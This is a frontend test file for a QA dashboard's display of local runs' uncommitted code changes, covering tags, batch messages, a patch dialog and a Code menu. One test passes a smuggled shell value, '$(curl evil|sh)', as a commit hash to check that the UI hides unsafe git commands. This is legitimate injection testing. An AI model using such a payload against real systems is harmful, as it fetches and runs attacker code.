/**
 * The run tag, the batch callout, the changes dialog and the sidebar view of local runs' code changes.
 * Run with: cd webapp && npm test -- LocalChanges
 */
import { screen, fireEvent, within, waitFor } from '@testing-library/react';

import { renderWithProviders } from '../../../test-utils';
import { LocalChangesTag } from '../LocalChangesTag';
import LocalChangesDialog from '../LocalChangesDialog';
import LocalChangesView from '../LocalChangesView';
import { LocalChangesSharedContext, group_local_changes } from '../localChanges';
import { BatchStatusMessages } from '../../messages';
import { copyWithToast } from '../../../utils/clipboard';

vi.mock('../../MonacoEditor', () => ({
  default: ({ value, language }) => <pre data-testid="editor" data-language={language}>{value}</pre>,
  MonacoDiffEditor: ({ original, value }) => <pre data-testid="diff">{original} ➡️ {value}</pre>,
  preloadMonaco: () => {},
}));
vi.mock('../../../utils/clipboard', async importOriginal => ({ ...await importOriginal(), copyWithToast: vi.fn() }));

const changes = (more = {}) => ({
  level: 'patch', scope: 'run', dirty: true, head: '3f2a1b9c0d1e2f30', branch: 'feature/x', upstream: 'origin/feature/x',
  files: [{ path: 'src/a.py', status: 'M', added: 30, deleted: 10 }, { path: 'src/b.py', status: 'A', added: 10, deleted: 2 }, { path: 'img.png', status: '?', added: null, deleted: null, binary: true }],
  files_total: 3, added: 40, deleted: 12, untracked: 1, sha256: 'aaa', patch: { path: '.qaboard/local-changes.patch', bytes: 1234 },
  ...more,
});
const run = (id, local_changes, more = {}) => ({
  id, test_input_path: `in${id}.raw`, test_input_database: 'db', configurations: [], output_dir_url: `/s/${id}`,
  data: local_changes === undefined ? {} : { local_changes }, ...more,
});

const files = {
  '/s/1/.qaboard/local-changes.patch': 'diff --git a/src/a.py b/src/a.py\n+new\n',
  '/s/1/.qaboard/unpushed.patch': 'From abc\ndiff --git a/c.py b/c.py\n+unpushed\n',
  '/s/9/.qaboard/local-changes.patch': 'diff --git a/src/a.py b/src/a.py\n+old\n',
};
beforeEach(() => {
  vi.stubGlobal('fetch', vi.fn(url => Promise.resolve(url in files ? new Response(files[url]) : new Response('not found', { status: 404, statusText: 'NOT FOUND' }))));
  window.history.replaceState(null, '', '/p/commit/abc');
  copyWithToast.mockClear();
});
afterEach(() => vi.unstubAllGlobals());


describe('LocalChangesTag', () => {
  it('counts the changes, and opens them', async () => {
    renderWithProviders(<LocalChangesTag output={run(1, changes())}/>);
    expect(screen.getByText('uncommitted +40 −12')).toBeInTheDocument();
    fireEvent.click(screen.getByRole('button', { name: /Uncommitted changes, 3 files, \+40 −12/ }));
    expect(await screen.findByRole('dialog')).toBeInTheDocument();
    expect(await screen.findByTestId('editor')).toHaveTextContent('+new');
  });

  it('says when git could not tell', () => {
    renderWithProviders(<LocalChangesTag output={run(1, changes({ dirty: null, timed_out: true }))}/>);
    expect(screen.getByText('local changes unknown')).toBeInTheDocument();
  });

  it("shows nothing for clean runs, runs without data, and changes the batch's callout already says", () => {
    const { container } = renderWithProviders(<>
      <LocalChangesTag output={run(1, changes({ dirty: false }))}/>
      <LocalChangesTag output={run(2)}/>
      <LocalChangesSharedContext value="3f2a1b9c0d1e2f30:aaa"><LocalChangesTag output={run(3, changes())}/></LocalChangesSharedContext>
    </>);
    expect(container).toBeEmptyDOMElement();
    renderWithProviders(<LocalChangesSharedContext value="3f2a1b9c0d1e2f30:aaa"><LocalChangesTag output={run(4, changes({ sha256: 'bbb' }))}/></LocalChangesSharedContext>);
    expect(screen.getByText('uncommitted +40 −12')).toBeInTheDocument();
  });
});


const batch_of = (runs, data = { type: 'local' }) => ({
  id: 1, batch_dir_url: '/s/batch', data,
  outputs: Object.fromEntries(runs.map(r => [r.id, r])),
  filtered: { outputs: runs.map(r => `${r.id}`), running_outputs: 0, pending_outputs: 0, deleted_outputs: 0 },
});
const renderBatch = runs => renderWithProviders(<BatchStatusMessages project="p" commit={{ id: 'abc' }} batch={batch_of(runs)} filter=""/>);

describe('the batch callout', () => {
  it('counts runs that differ only by their unpushed commits as different states', () => {
    renderBatch([run(1, changes()), run(2, changes({ pushed: false, unpushed_commits: 2 }))]);
    // they differ by their unpushed commits
    expect(screen.getByText("These runs didn't all run the same code: 2 with different uncommitted changes")).toBeInTheDocument();
  });

  it('shared changes', async () => {
    renderBatch([run(1, changes({ pushed: false, unpushed_commits: 2 })), run(2, changes({ pushed: false, unpushed_commits: 2 }))]);
    expect(screen.getByText(/Local runs on/)).toHaveTextContent('Local runs on 3f2a1b9c with uncommitted changes: 3 files, +40 −12 · 2 unpushed commits');
    expect(screen.queryByText(/Be careful/)).toBeNull();
    fireEvent.click(screen.getByRole('button', { name: 'View changes' }));
    expect(await screen.findByRole('dialog')).toBeInTheDocument();
  });

  it('runs without local changes', () => {
    renderBatch([run(1, changes({ dirty: false })), run(2, changes({ dirty: false }))]);
    expect(screen.getByText(/Local runs on/)).toHaveTextContent('Local runs on 3f2a1b9c, without local changes');
    expect(screen.queryByRole('button', { name: /View/ })).toBeNull();
  });

  it('runs that differ open the list of states', async () => {
    renderBatch([run(1, changes()), run(2, changes({ sha256: 'bbb' })), run(3, changes({ dirty: false })), run(4, changes({ dirty: null })), run(5)]);
    expect(screen.getByText("These runs didn't all run the same code: 2 with different uncommitted changes, 1 without, 1 unknown, 1 didn't record it")).toBeInTheDocument();
    fireEvent.click(screen.getByRole('button', { name: 'See which runs' }));
    await waitFor(() => expect(new URLSearchParams(window.location.search).get('selected_views')).toBe('local-changes'));
  });

  it('offers to view changes git could not tell', () => {
    renderBatch([run(1, changes({ dirty: null })), run(2, changes({ dirty: null }))]);
    expect(screen.getByText(/Local runs on/)).toHaveTextContent("Local runs on 3f2a1b9c: git couldn't tell whether they had local changes");
    expect(screen.getByRole('button', { name: 'View' })).toBeInTheDocument();
  });

  it('keeps the old warning for runs that recorded nothing', () => {
    renderBatch([run(1), run(2)]);
    expect(screen.getByText('Be careful, those are local runs')).toBeInTheDocument();
  });
});


describe('LocalChangesDialog', () => {
  const open = (output, output_ref) => renderWithProviders(<LocalChangesDialog isOpen onClose={() => {}} output={output} output_ref={output_ref}/>, { siteConfig: { docs_root: '/qa/' } });

  it('lists the files, shows the patch, and how to reproduce', async () => {
    open(run(1, changes({ excluded: ['secrets.env', '.env'], scope: 'batch' })));
    const dialog = screen.getByRole('dialog');
    expect(dialog).toHaveTextContent('Local changes of in1.raw');
    expect(dialog).toHaveTextContent('Commit3f2a1b9c');
    expect(dialog).toHaveTextContent('Branchfeature/x');
    expect(dialog).toHaveTextContent('Uncommitted3 files, +40 −12');
    expect(dialog).toHaveTextContent('Recorded when the batch started');
    expect(await screen.findByTestId('editor')).toHaveAttribute('data-language', 'diff');
    const list = within(screen.getByRole('list', { name: 'Changed files' }));
    // the files in the patch scroll it to their changes, the others are listed
    expect(list.getByRole('button', { name: 'src/a.py' })).toBeInTheDocument();
    expect(list.getByText('img.png')).toBeInTheDocument();
    expect(list.getByText('binary')).toBeInTheDocument();
    expect(list.getByText('New')).toBeInTheDocument();
    expect(list.getByLabelText('30 lines added')).toHaveTextContent('+30');
    expect(screen.getByText(/Not saved, they look like secrets or the project excludes them: secrets.env, .env/)).toBeInTheDocument();
    expect(screen.getByRole('link', { name: 'Docs' })).toHaveAttribute('href', '/qa/docs/local-changes');
    const download = screen.getByRole('button', { name: 'Download run-1-local-changes.patch' });
    expect(download).toHaveAttribute('href', '/s/1/.qaboard/local-changes.patch');
    expect(download).toHaveAttribute('download', 'run-1-local-changes.patch');
    expect(screen.getByText('qa restore 1')).toBeInTheDocument();
    expect(screen.getByText('git checkout 3f2a1b9c0d1e2f30 && git apply run-1-local-changes.patch')).toBeInTheDocument();
    fireEvent.click(screen.getAllByRole('button', { name: 'Copy the command' })[0]);
    expect(copyWithToast).toHaveBeenCalledWith('qa restore 1', expect.anything());
  });

  it.each([
    [{ omitted: 'too_large', bytes: 2048 * 1024 }, 'The patch is 2048 KB: too large to save (outputs.local_changes.max_patch_kb).'],
    [{ omitted: 'level' }, 'This server keeps only a summary of the code changes.'],
    [{ omitted: 'timeout' }, 'git took too long to compute the patch (outputs.local_changes.timeout, qa doctor).'],
    [{ omitted: 'no_answer' }, "The server didn't answer when the run started: the patch wasn't saved."],
  ])('says why the patch is missing: %o', (patch, message) => {
    open(run(1, changes({ patch })));
    expect(screen.getByText(message)).toBeInTheDocument();
    expect(screen.getByText(/The exact code can't be restored/)).toHaveTextContent("The exact code can't be restored: only the commit 3f2a1b9c and the list of changed files are known.");
    expect(screen.queryByTestId('editor')).toBeNull();
    expect(screen.queryByRole('button', { name: /Download/ })).toBeNull();
    expect(screen.queryByText(/qa restore/)).toBeNull();
  });

  it('says when the patch file is gone', async () => {
    open(run(3, changes()));
    expect(await screen.findByText("The patch file is missing: the run's files may have been deleted.")).toBeInTheDocument();
    await waitFor(() => expect(screen.queryByRole('button', { name: /Download/ })).toBeNull());
  });

  it('says when there were too many untracked files', () => {
    open(run(1, changes({ untracked_contents: 'too_many' })));
    expect(screen.getByText(/1 new file listed without their contents: too many/)).toBeInTheDocument();
  });

  const unpushed = { pushed: false, unpushed_commits: 2, base: 'bbbbbbbb', unpushed: { path: '.qaboard/unpushed.patch', bytes: 10, sha256: 'u' },
    unpushed_log: [{ sha: 'c'.repeat(40), subject: 'Faster demosaic' }, { sha: '$(x)', subject: 'not a sha' }] };
  it('shows the unpushed commits', async () => {
    open(run(1, changes(unpushed)));
    expect(screen.getByText('git checkout bbbbbbbb && git apply run-1-unpushed.patch && git apply run-1-local-changes.patch')).toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'Download run-1-unpushed.patch' })).toBeInTheDocument();
    fireEvent.click(screen.getByRole('radio', { name: 'Not pushed (2 commits)' }));
    expect(await screen.findByText(/\+unpushed/)).toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'c.py' })).toBeInTheDocument();
    expect(screen.getByText(/Changes from/)).toHaveTextContent('Changes from bbbbbbbb (last pushed) to 3f2a1b9c');
    const log = within(screen.getByRole('list', { name: 'Unpushed commits' }));
    expect(log.getAllByRole('listitem')).toHaveLength(1);
    expect(log.getByRole('listitem')).toHaveTextContent('cccccccc Faster demosaic');
  });

  it('opens clean runs on their unpushed commits', async () => {
    open(run(1, changes({ ...unpushed, dirty: false, files: [], files_total: 0, patch: undefined })));
    expect(screen.queryByRole('radio')).toBeNull();
    expect(await screen.findByText(/\+unpushed/)).toBeInTheDocument();
  });

  it("compares with the reference's changes", async () => {
    open(run(1, changes()), run(9, changes({ sha256: 'old' })));
    fireEvent.click(screen.getByRole('button', { name: "Compare with the reference's changes" }));
    expect(await screen.findByTestId('diff')).toHaveTextContent('+old ➡️ diff --git a/src/a.py b/src/a.py +new');
    expect(screen.getByText(/Left: the changes of reference/)).toBeInTheDocument();
    expect(screen.queryByText(/starts from other code/)).toBeNull();
  });

  it('warns when the reference ran another commit', async () => {
    open(run(1, changes()), run(9, changes({ sha256: 'old', head: 'dddddddd' })));
    fireEvent.click(screen.getByRole('button', { name: "Compare with the reference's changes" }));
    expect(await screen.findByText(/starts from other code/)).toHaveTextContent('The reference ran dddddddd: its patch starts from other code.');
  });

  it('only shows patches small enough', async () => {
    files['/s/2/.qaboard/local-changes.patch'] = 'x'.repeat(6 * 1024 * 1024);
    open(run(2, changes()));
    expect(await screen.findByText(/too large to show here/)).toHaveTextContent('The patch is over 6.0 MB: too large to show here.');
    expect(screen.queryByTestId('editor')).toBeNull();
    delete files['/s/2/.qaboard/local-changes.patch'];
  });

  it("hides git commands built from what isn't a sha", () => {
    open(run(1, changes({ head: '$(curl evil|sh)' })));
    expect(screen.queryByText('With git')).toBeNull();
    expect(screen.getByRole('dialog')).not.toHaveTextContent('curl');
  });

  it("doesn't offer to compare the same changes", () => {
    open(run(1, changes()), run(9, changes()));
    expect(screen.queryByRole('button', { name: /Compare/ })).toBeNull();
  });
});


describe('LocalChangesView', () => {
  it('lists the distinct states, with their runs', async () => {
    const groups = group_local_changes([run(1, changes({ sha256: 'abcdef0123' })), run(2, changes({ sha256: 'abcdef0123' })), run(3, changes({ dirty: false, pushed: true })), run(4)]);
    renderWithProviders(<LocalChangesView groups={groups}/>);
    expect(screen.getByText('The runs shown recorded 2 different sets of local changes.')).toBeInTheDocument();
    expect(screen.getByText(/Didn't record their local changes/)).toBeInTheDocument();

    expect(screen.getByText('Uncommitted changes: 3 files, +40 −12')).toBeInTheDocument();
    expect(screen.getByText('No local changes')).toBeInTheDocument();
    fireEvent.click(screen.getByRole('button', { name: '2 runs' }));
    expect(screen.getByText('in1.raw')).toBeInTheDocument();
    expect(screen.getByText('in2.raw')).toBeInTheDocument();
    expect(screen.getByText('abcdef0')).toBeInTheDocument();
    fireEvent.click(screen.getByRole('button', { name: 'Show only these 2 runs' }));
    await waitFor(() => expect(new URLSearchParams(window.location.search).get('filter')).toBe('id:(1|2)(?!\\d)'));
  });
});


describe('the Code menu', () => {
  it("says when the git host doesn't have the commit yet", async () => {
    const { Menu } = await import('@blueprintjs/core');
    const { CodeMenu } = await import('../../../AppSider');
    const project_data = { data: { git: { web_url: 'https://github.com/kitefin/isp', path_with_namespace: 'kitefin/isp' } } };
    renderWithProviders(<Menu><CodeMenu project="kitefin/isp" project_data={project_data} commit={{ id: '0123456789abcdef' }} unpushed={{ sha: '0123456789abcdef' }}/></Menu>);
    fireEvent.mouseEnter(screen.getByRole('menuitem', { name: /Code/ }));
    expect(await screen.findByText(/Not pushed: the git host doesn't have/)).toHaveTextContent("Not pushed: the git host doesn't have 01234567 yet");
    // links to the commit would 404: the menu goes to the repository, and to the last pushed commit
    expect(screen.getByRole('menuitem', { name: /Changes in/ })).toHaveAttribute('aria-disabled', 'true');
    const code = screen.getByRole('menuitem', { name: /^Code/ });
    expect((code.closest('a') ?? code.querySelector('a')).getAttribute('href')).toBe('https://github.com/kitefin/isp');
  });

  it('links to the last pushed commit', async () => {
    const { Menu } = await import('@blueprintjs/core');
    const { CodeMenu } = await import('../../../AppSider');
    const project_data = { data: { git: { web_url: 'https://github.com/kitefin/isp', path_with_namespace: 'kitefin/isp' } } };
    renderWithProviders(<Menu><CodeMenu project="kitefin/isp" project_data={project_data} commit={{ id: '0123456789abcdef' }} unpushed={{ sha: '0123456789abcdef', base: 'bbbbbbbbcccc' }}/></Menu>);
    fireEvent.mouseEnter(screen.getByRole('menuitem', { name: /Code/ }));
    const item = await screen.findByRole('menuitem', { name: /Last pushed commit, bbbbbbbb/ });
    expect((item.closest('a') ?? item.querySelector('a')).getAttribute('href')).toBe('https://github.com/kitefin/isp/commit/bbbbbbbbcccc');
  });
});
